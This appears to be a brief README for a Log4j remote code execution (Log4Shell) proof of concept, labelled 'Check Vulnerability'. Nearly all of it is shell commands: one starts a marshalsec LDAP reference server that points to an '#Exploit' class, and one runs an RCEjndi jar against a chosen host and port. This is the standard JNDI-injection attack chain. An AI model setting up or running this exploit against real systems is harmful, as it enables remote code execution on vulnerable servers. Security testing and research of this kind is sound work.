# log4jRCE


Check Vulnerability
```
export MY_HOST="localhost"
export MY_PORT=1389
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://${MY_HOST}:${MY_PORT}/#Exploit" 
java -jar target/RCEjndi-1.0-SNAPSHOT.jar $MY_HOST $MY_PORT
```